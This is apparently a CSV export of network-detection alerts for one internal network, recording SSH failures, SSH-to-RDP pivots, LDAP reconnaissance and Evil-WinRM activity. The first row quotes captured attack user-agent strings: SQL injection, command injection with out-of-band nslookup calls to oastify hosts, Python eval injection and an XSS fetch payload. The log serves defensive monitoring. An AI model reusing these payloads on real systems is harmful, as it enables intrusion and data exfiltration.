SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32731,2025-03-28T10:17:24Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,48662396-d602-4b85-aa0a-402d8480318e,
Low,32733,2025-03-28T10:27:05Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,0a914abe-6211-4509-9cde-75b1e18064b3,
Low,32735,2025-03-28T10:17:03Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,e41058bd-5fda-4c1d-a405-265530fd524c,
Low,32752,2025-03-28T08:46:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,e929ff46-2bf4-4f5a-8b05-93011ff90968,
Low,32908,2025-03-28T10:32:29Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1896 (10.0.3.30) to then pivot to asset 1709 (10.0.3.29) via RDP.,Interactive Session Pivots,"2896,1709",,,10.0.242.127,10.0.3.29,,,
Low,32974,2025-03-28T10:57:26Z,Indicator,Indicator,HTTP Request to Suspicious TLD .cc,HTTP Request to Suspicious TLD .cc,Suspicious TLD Signatures,"3505,1896",,,10.0.3.30,216.82.192.11,,Network Traffic,
Low,32982,2025-03-28T10:12:21Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.3.29 (1709) (Enterprise Management/Server) received RDP traffic from 10.0.3.30 (1896).,RDP to Enterprise Management Asset,"1896,1709",,,10.0.3.30,10.0.3.29,,bb839922-e1de-4be6-84b5-fbaa45dafb7e,
Low,32986,2025-03-28T10:06:45Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.3.12 (1791) (Enterprise Management/Server) received RDP traffic from 10.0.3.30 (1896).,RDP to Enterprise Management Asset,"1896,1791",,,10.0.3.30,10.0.3.12,,0d19f3cd-51d7-4a59-b72e-88760a405348,
Low,33512,2025-03-28T10:52:47Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1896 and Asset:1713,New SMB Communication Detection,"1896,1713",,,10.0.3.30,10.0.3.11,,5bcde757-9ca2-4ccc-8f12-bd4f1d92a5f5,
Low,33518,2025-03-28T10:58:16Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,1159fcd6-467e-4f4d-a750-0eaa20ec9f70,
Low,33519,2025-03-28T10:57:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,43f77e00-8b40-47a2-a958-7f3ff85216e8,
Low,33520,2025-03-28T10:58:41Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,5506a653-98ca-48b8-b2f0-d298542e43f9,
Low,33528,2025-03-28T10:45:29Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,a1b5441f-a30b-4338-951a-fb0d59069d4f,
Low,33532,2025-03-28T09:48:59Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,2180daa9-00e2-46d4-8fa1-098607e0da9d,
Low,33533,2025-03-28T09:48:55Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,23e44421-1532-44c8-9a39-3faf8b414b28,
Low,33535,2025-03-28T09:44:29Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,f04ad722-0ffd-459b-b7dc-e93ce78e71e4,
Low,33536,2025-03-28T09:48:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,76b07028-6fa3-48ae-8875-0a4baf8157e3,
Low,33558,2025-03-28T10:53:50Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:39:33.023Z and 2025-03-28T10:53:50.707Z,"Sample NewX509Certificate values include:
  server: 20.190.160.132, 184.25.50.177, 40.126.31.67, 95.100.158.122, 95.100.158.115, 52.182.143.209, 23.3.89.96, 2.16.110.161, 10.0.3.11, 142.250.74.202;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
  not_before: , 2025-03-04T20:39:31Z, 2025-03-27T01:24:33Z, 2025-03-16T00:00:00Z, 2025-03-09T16:45:25Z;
  server_asset_id: 1713, 3846, 3845, 3860, 3858, 3865, 3847, 357, 3853, 3850;
  dst__port: ('',);
  dns: ;
  uuid: e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3;
  issuer: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA;
  client_asset_id: 1896, 48, 1801, 1763, 1704, 1914;
  src__mac: ;
  not_after: , 2026-03-04T20:39:31Z, 2026-03-27T01:24:33Z, 2025-09-05T16:45:25Z, 2025-09-16T23:59:59Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.5.29, 10.0.4.29, 10.0.2.11, 10.0.10.29, 10.0.3.30;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"48,1713,3846,3845,3860,3858,3865,3847,357,3853,3850,1896,1801,1763,1704,1914",,,"10.0.3.11,23.32.238.128,40.126.31.67,20.42.73.24,95.100.158.115,23.11.206.96,40.90.65.142,20.190.160.4,142.250.185.110,104.208.16.90","10.0.2.11,10.0.3.30,10.0.10.29,10.0.4.29,10.0.5.29,10.0.7.30",,"e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3",
Low,33575,2025-03-28T11:02:06Z,Indicator,Threat Behavior,LDAP Request Accounts - Unconstrained Delegation,LDAP Request Accounts - Unconstrained Delegation,LDAP Based Recon,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Low,33576,2025-03-28T11:02:53Z,Indicator,Threat Behavior,LDAP Request Accounts - No Kerberos PreAuth,LDAP Request Accounts - No Kerberos PreAuth,LDAP Based Recon,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Low,33633,2025-03-28T10:59:31Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,9bc425c5-b0c2-4f04-ba04-6b9472ab8b24,
Low,33634,2025-03-28T10:59:25Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,c23627ff-e338-4c9c-9955-774a777f0c7e,
Low,33635,2025-03-28T09:59:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,5a3226c1-4364-4e3d-acfb-88f125bc1984,
Low,33636,2025-03-28T10:05:55Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,2e07d3c6-32cc-4634-b5a6-a2b7afc7ed48,
Low,33638,2025-03-28T10:12:02Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,5172cdcf-48c7-4fe8-a71b-4dbdda3cf303,
Low,33639,2025-03-28T10:00:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,f1861629-6721-4330-980e-4d8b017a7cbb,
Low,33640,2025-03-28T09:57:52Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,44b62314-d4f3-46bd-a5ca-8bfb4dc29c1e,
Low,33643,2025-03-28T09:58:51Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,244db388-67c7-4285-b421-a5b0449918d7,
Low,33655,2025-03-28T10:49:22Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1896 (10.0.3.30) to then pivot to asset 1709 (10.0.3.29) via RDP.,Interactive Session Pivots,"2896,1709",,,10.0.242.127,10.0.3.29,,,
Low,33711,2025-03-28T11:27:30Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1896 (10.0.3.30) to then pivot to asset 1709 (10.0.3.29) via RDP.,Interactive Session Pivots,"2896,1709",,,10.0.242.127,10.0.3.29,,,
Low,33732,2025-03-28T11:23:20Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,cf8cee3e-48f2-42d1-be09-635f97b1f4f5,
Low,33764,2025-03-28T11:23:59Z,Communication,Configuration,Detected 20 NewX509Certificate between 2025-03-28T11:09:16.198Z and 2025-03-28T11:23:59.659Z,"Sample NewX509Certificate values include:
  server: 23.3.89.123, 10.0.5.30, 142.250.181.227, 72.246.29.87, 74.125.99.39, 23.32.238.121, 23.3.110.134, 216.58.206.42, 20.189.173.16, 95.100.158.105;
  subject: ;
  not_before: ;
  server_asset_id: 3867, 3901, 3909, 3918, 3906, 3905, 3616, 3599, 3914, 69;
  dst__port: ('',);
  dns: ;
  uuid: 7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17;
  issuer: ;
  client_asset_id: 44, 1898, 1709, 1746, 1801, 1729, 1704, 1697, 1914;
  src__mac: ;
  not_after: ;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.6.29, 10.0.3.29, 10.0.5.29, 10.0.1.29, 10.0.6.30, 10.0.10.29, 10.0.9.29, 10.0.5.12;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"3867,3901,3909,3918,3906,3905,3616,3599,3914,69,44,1898,1709,1746,1801,1729,1704,1697,1914",,,"23.32.238.121,23.3.89.106,23.3.110.134,95.216.74.145,72.246.29.87,13.89.178.26,142.250.181.227,216.58.206.42,20.189.173.23,8.8.8.8","10.0.1.29,10.0.6.30,10.0.3.29,10.0.6.29,10.0.10.29,10.0.9.29,10.0.5.29,10.0.5.12,10.0.7.30",,"7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17",
Medium,33774,2025-03-28T11:34:47Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Medium,33775,2025-03-28T11:34:47Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Medium,33777,2025-03-28T11:34:47Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Medium,33782,2025-03-28T11:35:18Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1713,1896",,,10.0.3.30,10.0.3.11,,Network Traffic,
Low,33804,2025-03-28T11:35:18Z,Asset,Configuration,User-Agent First Seen from Host,"Asset 1896 made an HTTP request with User-Agent Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)) for the first time.",User Agent First Seen,1896,,,,,10.0.3.30,04fd9ef7-ea48-4f61-a860-0245ea084678,
Low,33839,2025-03-28T10:14:08Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"1896,2896",,,10.0.242.127,10.0.3.30,,19aa8ac9-e422-4400-a334-f27ddcf2cc7b,
Low,33842,2025-03-28T11:34:47Z,Communication,Indicator,Failed HTTP Logon,"Asset 1713 (10.0.3.11) returned an HTTP response code of 401 'Unauthorized' to asset 1896 (10.0.3.30), which represents a failed logon attempt via HTTP by asset 1896. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1896,1713",,,10.0.3.11,10.0.3.30,,bedcbd73-a660-4bd0-950d-b56bd7e8cb1d,
Low,33859,2025-03-28T11:37:06Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1896 (10.0.3.30) to then pivot to asset 1709 (10.0.3.29) via RDP.,Interactive Session Pivots,"2896,1709",,,10.0.242.127,10.0.3.29,,,
Low,35023,2025-03-28T11:48:07Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1896 (10.0.3.30) to then pivot to asset 1707 (10.0.3.44) via RDP.,Interactive Session Pivots,"2896,1707",,,10.0.242.127,10.0.3.44,,,
Low,35044,2025-03-28T10:44:57Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,0f443f54-995c-4bc7-b179-6e35878e780b,
Low,35045,2025-03-28T10:59:30Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,f1a2b26a-2f0f-44f3-a5e8-642f3490839d,
Low,35046,2025-03-28T10:28:04Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,098eb89c-a38b-46c1-bced-a3d501d09704,
Low,35048,2025-03-28T10:30:21Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,62e7ffd9-6d62-47c3-9ba3-4193ecfd90d3,
Low,35052,2025-03-28T09:52:47Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.3.30.,SSH Authentication Failure,"2896,1896",,,10.0.242.127,10.0.3.30,,43f61b66-86cd-4320-aea1-587c5d300ad3,
